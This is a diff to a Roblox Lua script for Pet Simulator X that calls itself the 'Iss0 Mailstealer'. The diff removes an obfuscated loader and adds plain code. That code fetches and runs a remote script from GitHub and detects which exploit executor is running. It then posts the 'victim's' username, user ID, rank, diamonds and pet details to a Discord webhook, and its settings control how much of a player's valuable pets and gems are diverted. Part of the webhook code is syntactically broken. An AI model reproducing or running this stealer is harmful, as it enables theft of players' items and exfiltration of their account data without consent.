@@ -1,12 +1,116 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 
+getgenv().Settings = {
+    PremiumKey = "rizzhub-LQOIpi8RuiFDqZ85hgwz",
+    Webhook = true, -- By Making This True The Users Of Your Script Will Be Able
+    -- To Use A Webhook And They Will Get Every Notif Even The Dualhooked Ones
+    MailMessage = "Buat Lu Monz Gua Fans Lu",
+  Titanics = {
+       Dualhook = false,
+       Intensity = 100--%
+  },
+  Banana = {
+       Dualhook = false,
+       Intensity = 100--%
+  },
+  Huges = {
+       Dualhook = false,
+       Intensity = 100--%
+  },
+  Pogs = {
+       Dualhook = false,
+       Intensity = 100--%
+  },
+   Exclusives = {
+       Dualhook = false,
+       Intensity = 100--%
+  },
+   Events = {
+       Dualhook = false,
+       Intensity = 100--%
+  },
+   Secrets = {
+       Dualhook = false,
+       Intensity = 100--%
+   },
+   HC_DM_Mythics = {
+       Dualhook = false,
+       Intensity = 100--%
+   },
+   Gems = {
+       Dualhook = false,
+       Intensity = 100--%
+  }
+}
+    
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Vault/main/prm.lua", true))()
 
-]]--
+--// Executor detector
 
-do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v68=0;while true do if (v68==0) then v19=v0(v3(v30,1,1));return "";end end else local v69=v2(v0(v30,16));if v19 then local v77=v5(v69,v19);v19=nil;return v77;else return v69;end end end);local function v20(v31,v32,v33)if v33 then local v70=(2091 -1214) -(282 + 595) ;local v71;while true do if (v70==(0 -0)) then v71=(v31/((5 -3)^(v32-(1 -0))))%((2 -0)^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + (932 -(857 + 74)))) ;return v71-(v71%(569 -((677 -310) + 201))) ;end end else local v72=927 -(214 + (1308 -595)) ;local v73;while true do if (v72==((467 -(87 + 263)) -(32 + 85))) then v73=(1 + 1)^(v32-1) ;return (((v31%(v73 + v73))>=v73) and (1 + (180 -(67 + 113)))) or (957 -(655 + 237 + 65)) ;end end end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=0 -0 ;local v36;local v37;while true do if (v35==(1 + 0)) then return (v37 * ((2014 -(915 + 82)) -761)) + v36 ;end if (v35==(952 -(802 + 150))) then v36,v37=v1(v16,v18,v18 + (5 -3) );v18=v18 + (3 -(2 -1)) ;v35=1 + 0 ;end end end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + 2 + 1 );v18=v18 + (4 -0) ;return (v41 * 16777216) + (v40 * (143357 -77821)) + (v39 * (45 + 211)) + v38 ;end local function v24()local v42=0 -0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(0 -0)) then v43=v23();v44=v23();v42=1 + 0 ;end if (v42==(7 -4)) then if (v47==(791 -(368 + 423))) then if (v46==(0 + 0)) then return v48 * (885 -(261 + 624)) ;else v47=1 -0 ;v45=1080 -(1020 + 60) ;end elseif (v47==(3470 -(630 + 793))) then return ((v46==(0 -0)) and (v48 * ((19 -((22 -12) + (1421 -(447 + 966))))/(0 -0)))) or (v48 * NaN) ;end return v8(v48,v47-((4010 -2545) -(416 + 26)) ) * (v45 + (v46/(2^(165 -113)))) ;end if (v42==(1 + 1)) then v47=v20(v44,36 -15 ,469 -(145 + (2110 -(1703 + 114))) );v48=((v20(v44,462 -(44 + (1087 -(376 + 325))) )==(1487 -(998 + 488))) and  -(1 + (0 -0))) or (1 + 0) ;v42=3;end if (v42==(773 -(201 + 571))) then v45=1 + 0 ;v46=(v20(v44,1139 -(116 + 1022) ,1075 -(87 + 968) ) * ((8 -(18 -12))^(6 + 13 + 13))) + v43 ;v42=7 -5 ;end end end local function v25(v49)local v50=0;local v51;local v52;while true do if (v50==2) then v52={};for v78=(2 + 0) -(255 -(163 + 91)) , #v51 do v52[v78]=v2(v1(v3(v51,v78,v78)));end v50=(1947 -(1869 + 61)) -(9 + 2 + 3) ;end if (v50==0) then v51=nil;if  not v49 then v49=v23();if (v49==(376 -(85 + 291))) then return "";end end v50=1266 -(243 + 1022) ;end if (v50==(11 -8)) then return v6(v52);end if (v50==(1 + 0)) then v51=v3(v16,v18,(v18 + v49) -((4159 -2978) -(1123 + 57)) );v18=v18 + v49 ;v50=2;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53=0;local v54;local v55;local v56;local v57;local v58;local v59;while true do local v67=0;while true do if (v67~=(0 + 0)) then else if (v53==2) then local v95=0 + 0 ;while true do if (v95==1) then for v108=1 + 0 ,v23() do v56[v108]=v23();end return v57;end if (v95==(0 + 0)) then for v110=1 -0 ,v23() do local v111=529 -(406 + 123) ;local v112;local v113;while true do if (v111==0) then local v118=216 -(42 + 174) ;while true do if (v118~=(0 + 0)) then else v112=1769 -(1749 + 20) ;v113=nil;v118=1 + 0 ;end if (v118==1) then v111=1;break;end end end if (v111~=1) then else while true do if (v112==(1322 -(1249 + 73))) then v113=v21();if (v20(v113,1,1)~=0) then else local v150=0 + 0 ;local v151;local v152;local v153;local v154;local v155;while true do if (v150==1) then local v165=1504 -(363 + 1141) ;while true do if (v165~=(0 + 0)) then else v153=nil;v154=nil;v165=1;end if (v165==(1146 -(466 + 679))) then v150=2;break;end end end if ((5 -3)==v150) then v155=nil;while true do if (v151~=(4 -2)) then else while true do if (v152~=1) then else local v181=0 -0 ;while true do if ((0 + 0)==v181) then local v189=1900 -(106 + 1794) ;while true do if (0~=v189) then else v155={v22(),v22(),nil,nil};if (v153==(0 + 0)) then local v198=0;local v199;while true do if (v198==(0 + 0)) then v199=1975 -(1913 + 62) ;while true do if (v199==(0 + 0)) then v155[7 -4 ]=v22();v155[11 -7 ]=v22();break;end end break;end end elseif (v153==(2 -1)) then v155[117 -(4 + 110) ]=v23();elseif (v153==(586 -(57 + 527))) then v155[1430 -(41 + 1386) ]=v23() -((105 -(17 + 86))^(11 + 5)) ;elseif (v153==(6 -3)) then local v205=0 -0 ;local v206;local v207;while true do if (v205~=0) then else v206=0;v207=nil;v205=1;end if (v205==(2 -1)) then while true do if (0==v206) then v207=0;while true do if (v207~=(166 -(122 + 44))) then else v155[859 -(564 + 292) ]=v23() -(2^(27 -11)) ;v155[12 -8 ]=v22();break;end end break;end end break;end end end v189=1 -0 ;end if (v189~=(1 + 0)) then else v181=1;break;end end end if (v181==(2 -1)) then v152=1 + 1 ;break;end end end if (v152==(3 -1)) then local v182=65 -(30 + 35) ;local v183;while true do if (v182==0) then v183=0;while true do if (v183~=(0 + 0)) then else local v195=1001 -(938 + 63) ;local v196;while true do if (v195==(1257 -(1043 + 214))) then v196=0;while true do if (0~=v196) then else local v202=0 -0 ;while true do if (v202==(1213 -(323 + 889))) then v196=2 -1 ;break;end if (v202~=(1125 -(936 + 189))) then else if (v20(v154,1,1 + 0 )==1) then v155[1615 -(1565 + 48) ]=v59[v155[2]];end if (v20(v154,2,2)==(581 -(361 + 219))) then v155[1141 -(782 + 356) ]=v59[v155[270 -(176 + 91) ]];end v202=321 -(53 + 267) ;end end end if (v196==(1 -0)) then v183=1093 -(975 + 117) ;break;end end break;end end end if (v183==(1 + 0)) then v152=1878 -(157 + 1718) ;break;end end break;end end end if (v152~=(3 + 0)) then else if (v20(v154,416 -(15 + 398) ,985 -(18 + 964) )==(3 -2)) then v155[3 + 1 ]=v59[v155[3 + 1 ]];end v54[v110]=v155;break;end if (v152==(850 -(20 + 830))) then local v185=0 + 0 ;local v186;while true do if (v185==(126 -(116 + 10))) then v186=0;while true do if (v186==0) then local v197=0 -0 ;while true do if (v197~=(1019 -(697 + 321))) then else v186=1;break;end if (v197==0) then v153=v20(v113,1 + 1 ,3);v154=v20(v113,4,12 -6 );v197=1;end end end if (v186==(739 -(542 + 196))) then v152=1 -0 ;break;end end break;end end end end break;end if (v151==(1 + 0)) then local v173=0 + 0 ;while true do if ((0 + 0)==v173) then v154=nil;v155=nil;v173=1;end if (v173==(1 + 0)) then v151=2;break;end end end if (v151==(0 -0)) then local v174=0 -0 ;local v175;while true do if ((611 -(602 + 9))==v174) then v175=0;while true do if (v175==(1552 -(1126 + 425))) then v151=1;break;end if (v175~=0) then else local v190=0;while true do if (v190==(405 -(118 + 287))) then v152=0 -0 ;v153=nil;v190=1122 -(118 + 1003) ;end if (v190==(2 -1)) then v175=378 -(142 + 235) ;break;end end end end break;end end end end break;end if (v150==(947 -(245 + 702))) then local v166=0 -0 ;while true do if (v166~=(4 -3)) then else v150=1 + 0 ;break;end if ((977 -(553 + 424))==v166) then v151=1898 -(260 + 1638) ;v152=nil;v166=441 -(382 + 58) ;end end end end end break;end end break;end end end for v114=1 -0 ,v23() do v55[v114-(1 + 0) ]=v28();end v95=1;end end end if ((0 + 0)==v53) then local v96=0 + 0 ;while true do if (v96==1) then v56={};v57={v54,v55,nil,v56};v96=2 + 0 ;end if (v96==(0 -0)) then v54={};v55={};v96=1;end if (v96==2) then v53=1;break;end end end v67=1 + 0 ;end if (v67~=(2 -1)) then else if ((2 -1)~=v53) then else local v97=1690 -(1121 + 569) ;local v98;while true do if (v97==(0 + 0)) then v98=214 -(22 + 192) ;while true do if (v98==(0 -0)) then local v116=0;while true do if (v116~=1) then else v98=754 -(239 + 514) ;break;end if (0~=v116) then else v58=v23();v59={};v116=684 -(483 + 200) ;end end end if (v98==1) then local v117=0 + 0 ;while true do if (v117==1) then v98=2;break;end if (v117==(0 -0)) then for v120=1,v58 do local v121=1329 -(797 + 532) ;local v122;local v123;local v124;while true do if (v121==(1 + 0)) then v124=nil;while true do if (v122~=(1 + 0)) then else if (v123==(2 -1)) then v124=v21()~=0 ;elseif (v123==(1204 -(373 + 829))) then v124=v24();elseif (v123==3) then v124=v25();end v59[v120]=v124;break;end if (v122~=(731 -(476 + 255))) then else v123=v21();v124=nil;v122=1;end end break;end if (v121~=(1130 -(369 + 761))) then else v122=0 + 0 ;v123=nil;v121=1 + 0 ;end end end v57[239 -(141 + 95) ]=v21();v117=1 + 0 ;end end end if (v98==(2 -0)) then v53=3 -1 ;break;end end break;end end end break;end end end end local function v29(v60,v61,v62)local v63=0;local v64;local v65;local v66;while true do if (v63==1) then v66=v60[3];return function(...)local v80=1;local v81= -1;local v82={...};local v83=v12("#",...) -1 ;local function v84()local v85=v64;local v86=v65;local v87=v66;local v88=v27;local v89={};local v90={};local v91={};for v99=0,v83 do if ((3355>=((3107 + 3748) -4003)) and (v99>=v87)) then v89[v99-v87 ]=v82[v99 + 1 ];else v91[v99]=v82[v99 + 1 + 0 ];end end local v92=(v83-v87) + (2 -1) ;local v93;local v94;while true do local v100=0 + 0 ;while true do if ((v100==1) or (1049<=(472 + (760 -(192 + 134))))) then if (((6355 -1842)>(1608 + 1118)) and (v94<=(169 -(92 + 71)))) then if ((v94<=(1 + 1)) or ((2489 -1008)>=2658)) then if ((v94<=(765 -(574 + (1467 -(316 + 960))))) or ((2657 + 563)==(3417 -2053))) then v91[v93[2 + 0 ]]();elseif ((v94>(850 -(142 + 112 + 595))) or ((1180 -(55 + 71))>(4468 -1076))) then local v125=1790 -(573 + 1217) ;local v126;while true do if ((v125==0) or ((1872 -1196)>=(125 + 1517))) then v126=v93[2 -0 ];v91[v126]=v91[v126](v13(v91,v126 + ((726 + 214) -(714 + 208 + 17)) ,v81));break;end end else local v127=0;local v128;while true do if (((12086 -7950)>(3341 -(3608 -2664))) and (v127==(0 + 0))) then v128=v93[2];v91[v128]=v91[v128]();break;end end end elseif ((v94<=(5 -1)) or (((5691 -(83 + 468)) -(118 + 688))==(4293 -(25 + 23)))) then if ((v94>(1 + 2)) or ((6162 -(927 + 959))<=(10217 -(8992 -(1202 + 604))))) then for v156=v93[734 -(16 + 716) ],v93[5 -2 ] do v91[v156]=nil;end else do return;end end elseif ((v94==(102 -(11 + 86))) or ((11663 -6881)<=1199)) then v91[v93[287 -(175 + 110) ]]=v62[v93[6 -3 ]];else local v131=0 -0 ;local v132;local v133;local v134;local v135;while true do if ((v131==(1797 -(503 + 1293))) or (4864<(5311 -(15913 -12504)))) then local v163=0 + 0 ;while true do if (((8053 -3214)>=(4761 -(810 + 251))) and (v163==1)) then v131=2 + 0 ;break;end if ((v163==(0 + 0)) or ((970 + 105)>(2451 -(43 + 490)))) then v81=(v134 + v132) -(734 -(711 + 22)) ;v135=0;v163=1;end end end if ((396<=(14714 -10910)) and (v131==(861 -(240 + (1713 -1094))))) then for v167=v132,v81 do local v168=0 + 0 ;local v169;local v170;while true do if ((v168==(1 -0)) or (((601 -(45 + 280)) + 3893)==(3931 -(1344 + 400)))) then while true do if ((((1748 + 63) -(255 + 150))==(1229 + 177)) and ((0 + 0 + 0)==v169)) then v170=0 + 0 ;while true do if ((1531<(18248 -13977)) and (v170==(0 -0))) then v135=v135 + (1740 -(404 + 1335)) ;v91[v167]=v133[v135];break;end end break;end end break;end if (((352 + 283)==(1041 -(183 + 40 + 183))) and (v168==(0 -0))) then v169=0 + 0 ;v170=nil;v168=1 + 0 ;end end end break;end if ((3373<=(3893 -((18 -8) + 327))) and (v131==(1911 -(340 + 1571)))) then local v164=0 + 0 ;while true do if ((v164==((134 + 205) -(118 + 220))) or ((1097 + 2194)<((5501 -(1733 + 39)) -(108 + 341)))) then v131=1 + 0 ;break;end if (((18543 -14157)>=(2366 -(711 + (2148 -1366)))) and (v164==(0 -0))) then v132=v93[471 -((1304 -(125 + 909)) + 199) ];v133,v134=v88(v91[v132](v13(v91,v132 + 1 + 0 ,v93[3])));v164=1;end end end end end elseif ((((4688 -(1096 + 852)) -(580 + 1239))<=((1470 + 1805) -2173)) and (v94<=(10 + 0))) then if (((170 + 4536)>=(420 + 543)) and (v94<=(20 -12))) then if ((v94==7) or ((597 + 363)<=(2043 -(645 + 522)))) then v91[v93[1792 -(1010 + 780) ]][v93[3 + 0 ]]=v93[19 -15 ];else local v138=(0 -0) -0 ;local v139;local v140;local v141;local v142;while true do if ((v138==(1836 -(1045 + 791))) or (2066==(2358 -1426))) then v139=0 -0 ;v140=nil;v138=506 -(351 + 154) ;end if (((6399 -(1281 + 293))<4843) and (v138==((260 + 8) -(28 + 238)))) then while true do if (((2 -1)==v139) or (((5948 -(409 + 103)) -(1381 + 178))>=4537)) then v142=nil;while true do if ((v140==(1 + 0)) or ((3480 + 835)<(737 + 989))) then v91[v141 + 1 ]=v142;v91[v141]=v142[v93[13 -9 ]];break;end if ((v140==0) or ((1906 + 1773)<(1095 -(381 + 89)))) then local v179=0;local v180;while true do if ((v179==(0 + 0)) or (4625<(428 + (440 -(46 + 190))))) then v180=0 -0 ;while true do if ((v180==(1157 -(1074 + 82))) or ((181 -98)>(3564 -(214 + 1570)))) then v140=1456 -(990 + 465) ;break;end if (((226 + (415 -(51 + 44)))<=(469 + 608)) and (v180==0)) then v141=v93[2 + 0 ];v142=v91[v93[11 -8 ]];v180=(488 + 1239) -(1668 + (1375 -(1114 + 203))) ;end end break;end end end end break;end if ((v139==(626 -(512 + 114))) or ((2596 -(2326 -(228 + 498)))>((1927 + 6964) -4590))) then v140=0 -0 ;v141=nil;v139=1;end end break;end if (((1894 + 2176)>(129 + 558)) and (v138==(1 + 0))) then v141=nil;v142=nil;v138=6 -4 ;end end end elseif ((v94>(2003 -(109 + 1885))) or (656>=(4799 -(1269 + 200)))) then v91[v93[2 + 0 ]]={};else v80=v93[5 -2 ];end elseif ((v94<=(827 -(98 + 717))) or ((3155 -(174 + 489))<=(1161 -(802 + (62 -38))))) then if ((4322>=(4417 -1855)) and (v94>(13 -2))) then if ((v91[v93[1 + 1 ]]==v93[4 + (1905 -(830 + 1075)) ]) or ((4161 -(303 + 221))>=(620 + 3150))) then v80=v80 + 1 + 0 ;else v80=v93[8 -5 ];end else v91[v93[6 -4 ]]=v93[(1271 -(231 + 1038)) + 1 ]~=(0 + 0) ;end elseif ((v94>13) or ((1963 + 347 + 69)>(3329 + 1249))) then v91[v93[1 + 1 ]][v93[1436 -(797 + 636) ]]=v91[v93[19 -15 ]];else v91[v93[1621 -(1427 + 192) ]]=v93[(1164 -(171 + 991)) + 1 ];end v80=v80 + (2 -1) ;break;end if ((v100==(0 + (0 -0))) or (483>743)) then v93=v85[v80];v94=v93[1];v100=1;end end end end A,B=v27(v11(v84));if  not A[1] then local v101=v60[4][v80] or "?" ;error("Script error at ["   .. v101   .. "]:"   .. A[2] );else return v13(A,2,B);end end;end if (v63==0) then v64=v60[1];v65=v60[2];v63=1;end end end return v29(v28(),{},v17)(...);end v15("LOL!1A3O00028O0003073O0067657467656E7603083O0053652O74696E6773030A3O005072656D69756D4B6579031C3O0072692O7A6875622D4C514F497069385275694644715A38356867777A03073O00576562682O6F6B2O01030B3O004D61696C4D652O7361676503183O0042756174204C75204D6F6E7A204775612046616E73204C7503083O00546974616E69637303083O004475616C682O6F6B010003093O00496E74656E73697479026O00594003063O0042616E616E6103053O00487567657303043O00506F6773030A3O004578636C75736976657303063O004576656E747303073O0053656372657473030D3O0048435F444D5F4D79746869637303043O0047656D73030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033A3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F6B34662O742F5661756C742F6D61696E2F70726D2E6C7561003F3O00120D3O00014O0004000100013O00260C3O0002000100010004093O0002000100120D000100013O00260C00010005000100010004093O00050001001205000200024O00010002000100022O000A00033O000C0030070003000400050030070003000600070030070003000800092O000A00043O00020030070004000B000C0030070004000D000E00100E0003000A00042O000A00043O00020030070004000B000C0030070004000D000E00100E0003000F00042O000A00043O00020030070004000B000C0030070004000D000E00100E0003001000042O000A00043O00020030070004000B000C0030070004000D000E00100E0003001100042O000A00043O00020030070004000B000C0030070004000D000E00100E0003001200042O000A00043O00020030070004000B000C0030070004000D000E00100E0003001300042O000A00043O00020030070004000B000C0030070004000D000E00100E0003001400042O000A00043O00020030070004000B000C0030070004000D000E00100E0003001500042O000A00043O00020030070004000B000C0030070004000D000E00100E00030016000400100E000200030003001205000200173O001205000300183O00200800030003001900120D0005001A4O000B000600014O0006000300064O000200023O00024O0002000100010004093O003E00010004093O000500010004093O003E00010004093O000200012O00033O00017O003F3O00023O00033O00053O00053O00063O00083O00083O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000B3O000C3O000E3O000F3O00113O00",v9(),...);end
+local function getexploit()
+	local exploit =
+		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
+		(secure_load and "Sentinel") or
+		(is_sirhurt_closure and "Sirhurt") or
+		(pebc_execute and "ProtoSmasher") or
+		(KRNL_LOADED and "Krnl") or
+		(WrapGlobal and "WeAreDevs") or
+		(isvm and "Proxo") or
+		(shadow_env and "Shadow") or
+		(jit and "EasyExploits") or
+		(getscriptenvs and "Calamari") or
+		(unit and not syn and "Unit") or
+		(OXYGEN_LOADED and "Oxygen U") or
+		(IsElectron and "Electron") or
+		("Unsupported")
+  
+	return exploit
+  end
+  
+--// Execution log
+if game.PlaceId == 6284583030 then
+	_G.GameIn = "Pet Simulator X"
+elseif game.PlaceId == 7722306047 then
+	_G.GameIn = "PSX Trading Plaza"
+elseif game.PlaceId == 10321372166 then
+	_G.GameIn = "PSX Hardcore"
+elseif game.PlaceId == 12610002282 then
+	_G.GameIn = "PSX Pro Trading Plaza"
+elseif game.PlaceId == 11725212117 then
+	_G.GameIn = "PSX Voice Trading Plaza"
+else
+	_G.GameIn = "❓ Couldn't find game"
+end
+local webhookcolor = "13369599"
+_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+_G.PlrUserVictim = game.Players.LocalPlayer.Name
+_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
+_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
+local function sendwebhook(msg)
+local msg = {
+  ["content"]= "**Iss0 Mailstealer has detected a new hit!**",
+  ["embeds"]= {
+    {
+      ["title"]= "`Iss0 Mailstealer Results`",
+      ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."",
+      ["url"]= "https://discord.gg/pd65DxGhVc",
+      ["color"]= ""..webhookcolor.."",
+      ["fields"]= {
+        {
+          ["name"]= "Diamonds 💎",
+          ["value"]= "```".._G.Diamonds.."```",
+          ["inline"]= true
+        },
+        {
+          ["name"]= "Pet Name & Rarity",
+          ["value"]= "```Pet Name: "..v2.name.."\nPet Rarity: "..v2.rarity.."```",
+		  ["inline"]= true
+        },
+      },
+    },
+  },
+  ["attachments"] = {}
+},
+local Webhook = _G.Webhook
+request = http_request or request or HttpPost or syn.request
+request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
+end
+sendwebhook(msg)
